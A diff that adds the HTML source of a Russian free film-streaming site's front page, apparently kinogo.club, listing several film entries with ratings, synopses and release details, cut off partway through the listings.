@@ -1,0 +1,1570 @@
+
+<!doctype html>
+<html lang="ru-RU">
+<head>
+<meta name="yandex-verification" content="0f6ba9377655f15c" />
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
+<title>Смотреть кино фильмы онлайн бесплатно, фильмы 2012 в хорошем качестве на KinoGo.Net</title>
+<meta name="description" content="У нас большой выбор онлайн фильмов последних лет, абсолютно все последние новинки 2012, 2013 года в хорошем качестве без регистрации." />
+<meta name="keywords" content="смотреть кино онлайн, смотреть фильм, фильмы 2013 смотреть онлайн, фильмы онлайн бесплатно, смотреть фильмы онлайн бесплатно без регистрации, смотреть фильмы 2012 в хорошем качестве, кино в хорошем качестве, онлайн-кинотеатр" />
+<link rel="search" type="application/opensearchdescription+xml" href="http://kinogo.club/engine/opensearch.php" title="Смотреть кино фильмы онлайн бесплатно, фильмы 2012 в хорошем качестве на KinoGo.Net" />
+<script type="text/javascript" src="/engine/classes/js/jquery.js"></script>
+<script type="text/javascript" src="/engine/classes/js/jqueryui.js"></script>
+<script type="text/javascript" src="/engine/classes/js/dle_js.js"></script>
+<script type="text/javascript" src="/engine/classes/highslide/highslide.js"></script>
+<link rel="shortcut icon" href="/templates/kinogo/images/favicon.ico" />
+<link media="screen" href="/templates/kinogo/style/styles.css" type="text/css" rel="stylesheet" />
+<link media="screen" href="/templates/kinogo/style/engine.css" type="text/css" rel="stylesheet" /> 
+<meta name="google-site-verification" content="7XCg9LfzWXZiuOJDrPh0LF2i2IZG9gV8DhY34gyFyys" />
+<script type="text/javascript" src="/templates/kinogo/carusel/jquery.elegantcarousel.min_ob.js"></script>
+<script type="text/javascript" src="/templates/kinogo/carusel/libs.js"></script>  
+    
+
+
+<link media="screen" href="/templates/kinogo/style/bbcodes.css" type="text/css" rel="stylesheet" />
+<script type="text/javascript" src="/templates/kinogo/js/social-likes.min.js"></script>
+
+<link rel="stylesheet" href="/templates/kinogo/style/social-likes.css" type="text/css">
+<script type="text/javascript" src="/templates/kinogo/js/tooltip.js"></script>
+<script type="text/javascript" src="/templates/kinogo/js/nocopy.js"></script>
+<link rel="image_src" href="/templates/kinogo/images/logo.png">
+<style>
+body {background: url(/templates/kinogo/backgrounds/IronMan3.jpg) 50% 0 no-repeat #000;}
+    </style>
+ 
+<!--[if lt IE 8]>
+<style type="text/css">
+.pomoshnik, .content {padding-bottom: 0em; margin-bottom: 0em;}
+</style>
+<![endif]-->
+    
+    
+</head>
+<body>
+<div id="loading-layer" style="display:none">Загрузка. Пожалуйста, подождите...</div>
+<script type="text/javascript">
+<!--
+var dle_root       = '/';
+var dle_admin      = '';
+var dle_login_hash = '';
+var dle_group      = 5;
+var dle_skin       = 'kinogo';
+var dle_wysiwyg    = '0';
+var quick_wysiwyg  = '0';
+var dle_act_lang   = ["Да", "Нет", "Ввод", "Отмена", "Сохранить"];
+var menu_short     = 'Быстрое редактирование';
+var menu_full      = 'Полное редактирование';
+var menu_profile   = 'Просмотр профиля';
+var menu_send      = 'Отправить сообщение';
+var menu_uedit     = 'Админцентр';
+var dle_info       = 'Информация';
+var dle_confirm    = 'Подтверждение';
+var dle_prompt     = 'Ввод информации';
+var dle_req_field  = 'Заполните все необходимые поля';
+var dle_del_agree  = 'Вы действительно хотите удалить? Данное действие невозможно будет отменить';
+var dle_spam_agree = 'Вы действительно хотите отметить пользователя как спамера? Это приведет к удалению всех его комментариев';
+var dle_complaint  = 'Нашли ошибку на сайте? Не работает видео? Сообщите нам!';
+var dle_big_text   = 'Выделен слишком большой участок текста.';
+var dle_orfo_title = 'Укажите комментарий для администрации к найденной грамматической ошибке';
+var dle_p_send     = 'Отправить';
+var dle_p_send_ok  = 'Уведомление успешно отправлено';
+var dle_save_ok    = 'Изменения успешно сохранены. Обновить страницу?';
+var dle_del_news   = 'Удалить статью';
+var allow_dle_delete_news   = false;
+//-->
+</script><script type="text/javascript">  
+<!--  
+	hs.graphicsDir = '/engine/classes/highslide/graphics/';
+	hs.outlineType = 'rounded-white';
+	hs.numberOfImagesToPreload = 0;
+	hs.showCredits = false;
+	hs.dimmingOpacity = 0.60;
+	hs.lang = {
+		loadingText :     'Загрузка...',
+		playTitle :       'Просмотр слайдшоу (пробел)',
+		pauseTitle:       'Пауза',
+		previousTitle :   'Предыдущее изображение',
+		nextTitle :       'Следующее изображение',
+		moveTitle :       'Переместить',
+		closeTitle :      'Закрыть (Esc)',
+		fullExpandTitle : 'Развернуть до полного размера',
+		restoreTitle :    'Кликните для закрытия картинки, нажмите и удерживайте для перемещения',
+		focusTitle :      'Сфокусировать',
+		loadingTitle :    'Нажмите для отмены'
+	};
+	
+//-->
+</script>  
+    
+  
+
+
+<div class="header_black"></div><!--header_black-->
+
+        
+
+<div class="wrapper">
+
+
+<div class="contener">
+<div class="contener2">
+<div class="content">
+
+
+
+
+
+
+
+<noindex><div class="rek_top">
+<!-- BEGIN TAG - BODY -->
+<div id="b769dee615" style="display:none;"></div>
+<!-- END TAG - BODY -->
+<div style="padding-top:15px;padding-bottom:3px;text-align:center;font-size:11px;"><a href="http://kinogo.club/konkurs.html" target=_blank rel=nofollow><img src="/uploads/konkurs.png" border=0></a></div>
+</div></noindex>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    <div id='dle-content'><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6744'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:62.9px;">3.7</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6744'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6744'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6744'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6744'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6744'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6744-byk-iz-bronksa-2017.html">Бык из Бронкса (2017)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div id="news-id-6744" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-03/1488802534_bykizbronksa.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-03/1488802534_bykizbronksa.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-03/thumbs/1488802534_bykizbronksa.jpg" style="float:left;" alt='Бык из Бронкса (2017)' title='Бык из Бронкса (2017)'  /></a><!--TEnd-->Джакоббе «Джейк» Ламотта, которому суждено было стать великим спортсменом, родился в 1921 году в семье выходцев из Италии. Он рос в самом опасном и жестоком районе Нью-Йорка Бронксе, поэтому с раннего возраста стал учиться защищать себя, а помогал ему в тренировках родной отец. Довольно рано стало понятно, что простой паренёк из небогатой семьи обладает настоящим боксёрским талантом, и вскоре он уже стал добиваться первых побед на любительском уровне. В 1941 году Джейк, будучи ещё совсем юношей, дебютировал на профессиональном ринге и...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmy_2017/" >2017</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/dramy/" >Драма</a>, <a href="http://kinogo.club/biografiyi/" >Биография</a>, <a href="http://kinogo.club/sportivnye/" >Спортивный</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:33:36<br /><b>Премьера (РФ):</b> 6 января 2017</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6744-byk-iz-bronksa-2017.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Бык из Бронкса (2017) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">Вчера, 15:17 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6743'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:66.3px;">3.9</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6743'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6743'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6743'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6743'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6743'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6743-mina-2017.html">Мина (2017)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div id="news-id-6743" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-03/1488802408_mina.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-03/1488802408_mina.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-03/thumbs/1488802408_mina.jpg" style="float:left;" alt='Мина (2017)' title='Мина (2017)'  /></a><!--TEnd-->Из-за проблем в семье Майк отправляется служить в Афганистан. Во время выполнения очередной миссии где-то посреди бескрайней пустыни, герой совершает огромную ошибку и, не выполнив приказ, проваливает важное задание. Он и его друг Томми оказались в крайне затруднительном положении, ведь они заблудились в пустыни, а за ними гонится толпа разъярённых противников, главаря которых они должны были убить. Солдаты попадают в песчаную бурю, но успевают вызвать по рации штаб и получить координаты деревни, где и произойдёт эвакуация...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmy_2017/" >2017</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/trillery/" >Триллер</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:46:30<br /><b>Премьера (РФ):</b> 10 января 2017</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6743-mina-2017.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Мина (2017) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">Вчера, 15:14 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6742'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:69.7px;">4.1</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6742'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6742'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6742'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6742'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6742'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6742-horoshie-deti-2016.html">Хорошие дети (2016)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div id="news-id-6742" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-03/1488802235_horoshiedeti.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-03/1488802235_horoshiedeti.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-03/thumbs/1488802235_horoshiedeti.jpg" style="float:left;" alt='Хорошие дети (2016)' title='Хорошие дети (2016)'  /></a><!--TEnd-->Четверо лучших друзей учатся в элитной школе и являются круглыми отличниками. За всё время они не посетили ни одной вечеринки и практически не знают, что такое взрослая жизнь. При этом они добились больших успехов в учёбе и готовятся поступать в лучшие высшие учебные заведения страны. Но, понимая, сколько всего они упустили, решают напоследок хорошенько оторваться и попробовать всё, что они ещё не пробовали. Для них начинается самый сумасшедший, непредсказуемый и весёлый период в их жизни. Ребята и представить себе не могли, насколько...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmi_2016/" >2016</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/komedii/" >Комедия</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:29:28<br /><b>Премьера (РФ):</b> 14 июля 2016</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6742-horoshie-deti-2016.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Хорошие дети (2016) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">Вчера, 15:10 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6741'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:59.5px;">3.5</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6741'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6741'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6741'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6741'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6741'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6741-bitva-prepodov-2017.html">Битва преподов (2017)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div id="news-id-6741" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-03/1488534526_bitvaprepodov.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-03/1488534526_bitvaprepodov.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-03/thumbs/1488534526_bitvaprepodov.jpg" style="float:left;" alt='Битва преподов (2017)' title='Битва преподов (2017)'  /></a><!--TEnd-->Все привыкли видеть школьные драки между детьми, но никто и представить себе не мог, что разногласия между двумя преподавателями приведут к тому, что они соберутся драться на заднем дворе учебного заведения. Всё началось с того, что кроткий и неуверенный в себе учитель английского языка Энди Кэмпбелл из-за череды курьёзных случайностей стал заклятым врагом для одного из своих коллег – большого преподавателя с суровым лицом Рона Стриклэнда. Энди твёрдо убеждён, что педагогические методы его коллеги не только бессмысленны, но и могут нести реальную...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmy_2017/" >2017</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/komedii/" >Комедия</a><br /><b>Качество:</b> TS<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:23:52<br /><b>Премьера (РФ):</b> 16 февраля 2017</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6741-bitva-prepodov-2017.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Битва преподов (2017) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">3 марта 2017 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6610'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:81.6px;">4.8</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6610'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6610'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6610'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6610'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6610'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6610-po-soobrazheniyam-sovestie-2016.html">По соображениям совести (2016)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div class="lenta"> 
+    <div class="edge-left"></div><div class="cont">Лицензия</div></div><div id="news-id-6610" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2016-11/1479485978_posoobrazheniyamsovesti.jpg|left--><a href="http://kinogo.club/uploads/posts/2016-11/1479485978_posoobrazheniyamsovesti.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2016-11/thumbs/1479485978_posoobrazheniyamsovesti.jpg" style="float:left;" alt='По соображениям совести (2016)' title='По соображениям совести (2016)'  /></a><!--TEnd-->Обыкновенный парень по имени Дезмонд Досс мечтал учиться на медика, но его знаний для поступления не хватило, и тогда он решил служить своей стране иначе. Вторая мировая война в самом разгаре, и герой стал с другими новобранцами проходить подготовку перед фронтом. Но он оказался вовсе не обычным солдатом, а со своими убеждениями. Всё дело в том, что Дезмонд выступает категорически против насилия и даже отказывается брать в руки оружие. Он твёрдо решил, что будет на фронте помогать своей стране не убийствами противника, а спасением жизней своих товарищей...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmi_2016/" >2016</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/voennye/" >Военный</a>, <a href="http://kinogo.club/istoricheskie/" >Исторический</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Дублированный<br /><b>Продолжительность:</b> 02:19:20<br /><b>Премьера (РФ):</b> 17 ноября 2016</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6610-po-soobrazheniyam-sovestie-2016.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть По соображениям совести (2016) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">3 марта 2017 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6692'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:54.4px;">3.2</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6692'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6692'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6692'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6692'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6692'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6692-dolgaya-progulka-billi-linna-v-pereryve-futbolnogo-matcha-2017.html">Долгая прогулка Билли Линна в перерыве футбольного матча (2017)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div class="lenta"> 
+    <div class="edge-left"></div><div class="cont">Лицензия</div></div><div id="news-id-6692" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-01/1484849667_dolgayaprogulka.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-01/1484849667_dolgayaprogulka.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-01/thumbs/1484849667_dolgayaprogulka.jpg" style="float:left;" alt='Долгая прогулка Билли Линна в перерыве футбольного матча (2017)' title='Долгая прогулка Билли Линна в перерыве футбольного матча (2017)'  /></a><!--TEnd-->Простой девятнадцатилетний парень по имени Билли Линн несёт службу в Ираке и мечтает когда-нибудь целым и невредимым вернуться домой к близким. На службе он нашёл много верных друзей, которые практически стали его второй семьёй. Во время очередного боя взвод, в котором служит Билли, попадает в объективы портативных новостных камер. Из простых солдат начинают делать героев, и вскоре взвод становится национальной гордостью. Люди восхищаются храбростью и отвагой, проявленной военными во время жестокого боя, и обсуждают их профессиональные навыки...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmy_2017/" >2017</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/voennye/" >Военный</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:52:43<br /><b>Премьера (РФ):</b> 2 марта 2017</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6692-dolgaya-progulka-billi-linna-v-pereryve-futbolnogo-matcha-2017.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Долгая прогулка Билли Линна в перерыве футбольного матча (2017) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">3 марта 2017 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6740'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:49.3px;">2.9</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6740'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6740'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6740'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6740'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6740'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6740-pereryv-2017.html">Перерыв (2017)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
+<div class="shortimg"><div id="news-id-6740" style="display:inline;"><!--TBegin:http://kinogo.club/uploads/posts/2017-03/1488533823_pereryv.jpg|left--><a href="http://kinogo.club/uploads/posts/2017-03/1488533823_pereryv.jpg" onclick="return hs.expand(this)" ><img src="/uploads/posts/2017-03/thumbs/1488533823_pereryv.jpg" style="float:left;" alt='Перерыв (2017)' title='Перерыв (2017)'  /></a><!--TEnd-->Крис и Честер – лучшие друзья и коллеги по работе в продуктовом магазине. Они, несмотря на совершенно разные характеры, проводят много времени вместе и мечтают, что в будущем смогут добиться чего-то большего, чем перебирание товаров на полках супермаркета. В последнее время между ними стали возникать некие разногласия, а виной всему желание трудолюбивого Честера накопить немного денег и отправиться в путешествие по Бразилии. Крис же привык жить одним днём и пытается уговорить друга отправиться на рок-концерт, на который они смогут пройти по поддельным...<br /><br /><b>Год выпуска:</b> <a href="http://kinogo.club/filmy_2017/" >2017</a><br /><b>Страна:</b> <a href="http://kinogo.club/amerikanskie_filmy/" >США</a><br /><b>Жанр:</b> <a href="http://kinogo.club/komedii/" >Комедия</a><br /><b>Качество:</b> HDRip<br /><b>Перевод:</b> Профессиональный (многоголосый)<br /><b>Продолжительность:</b> 01:20:08<br /><b>Премьера (РФ):</b> 20 февраля 2017</div></div>
+
+
+</div><!--shortstory-->
+<div style="clear:both"></div>
+
+ <div class="icons">
+ 
+     <span class="podrobnee" style="padding: 4px 0 4px 20px;"><a href="http://kinogo.club/6740-pereryv-2017.html"><span class="fbutton-img"><img src="/templates/kinogo/images/viewmore.png" border="0" alt="смотреть Перерыв (2017) онлайн"></span></a></span>  
+ 
+
+ 
+ 
+ <span style="float:right; padding: 7px 20px 19px 20px;">
+
+
+
+     
+
+<span class="dateicon"  title="Дата">3 марта 2017 </span> 
+
+
+
+ 
+ 
+ </span>
+ 
+</div><!--icons--><div class="shortstory">
+
+
+<div class="shortstorytitle">
+
+
+<div style="width: 120px;float: right;">
+    
+    
+    <span class="izbrannoe"  title="Требуется регистрация, для добавления в избранное"><img src="/templates/kinogo/dleimages/plus_fav.gif" /></span>
+    
+    
+   <span class="podrobnosti_right"><div id='ratig-layer-6739'><div class="rating">
+		<ul itemprop="rating" itemscope itemtype="http://data-vocabulary.org/Rating" class="unit-rating">
+		<li itemprop="average" class="current-rating" style="width:62.9px;">3.7</li>
+		<li><a href="#" title="Плохо" class="r1-unit" onclick="doRate('1', '6739'); return false;">1</a></li>
+		<li><a href="#" title="Приемлемо" class="r2-unit" onclick="doRate('2', '6739'); return false;">2</a></li>
+		<li><a href="#" title="Средне" class="r3-unit" onclick="doRate('3', '6739'); return false;">3</a></li>
+		<li><a href="#" title="Хорошо" class="r4-unit" onclick="doRate('4', '6739'); return false;">4</a></li>
+		<li itemprop="best"><a href="#" title="Отлично" class="r5-unit" onclick="doRate('5', '6739'); return false;">5</a></li>
+		</ul>
+</div></div></span>
+</div>
+
+
+<h2 class="zagolovki"><a href="http://kinogo.club/6739-ledi-krovavyy-boy-2017.html">Леди Кровавый Бой (2017)</a></h2>
+
+
+
+</div><!--shortstorytitle-->
+
+
+
+
+
